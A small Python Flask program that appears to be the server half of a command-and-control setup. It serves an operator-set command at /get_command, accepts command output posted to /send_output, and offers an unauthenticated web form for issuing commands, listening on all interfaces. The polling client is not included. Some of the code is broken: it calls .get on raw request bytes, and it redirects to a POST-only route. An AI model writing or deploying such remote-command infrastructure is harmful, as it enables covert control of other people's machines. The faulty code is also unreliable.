from flask import Flask, request, redirect, url_for, render_template_string, session

app = Flask(__name__)
app.secret_key = 'your_secret_key'  # Needed for session management

# Variable to store the current command and output
current_command = ''
stored_output = ''

@app.route('/get_command', methods=['GET'])
def get_command():
    global current_command
    response = f"<command>{current_command}</command>"
    return response, 200, {'Content-Type': 'text/plain'}

@app.route('/send_output', methods=['POST'])
def send_output():
    global stored_output
    output = request.data.get('output')
    stored_output = output
    return redirect(url_for('input_page'))

@app.route('/update_command', methods=['POST'])
def update_command():
    global current_command
    new_command = request.form.get('command')
    current_command = new_command
    return redirect(url_for('input_page'))

@app.route('/input', methods=['GET', 'POST'])
def input_page():
    if request.method == 'POST':
        new_command = request.form.get('command')
        return redirect(url_for('update_command', command=new_command))

    return render_template_string('''
        <form method="post" action="/update_command">
            Command: <input type="text" name="command">
            <input type="submit" value="Submit">
        </form>
        <h2>Stored Output:</h2>
        <div>{{ stored_output }}</div>
    ''', stored_output=stored_output)

if __name__ == '__main__':
    # Run the Flask app on port 5000
    app.run(host='0.0.0.0', port=5000)
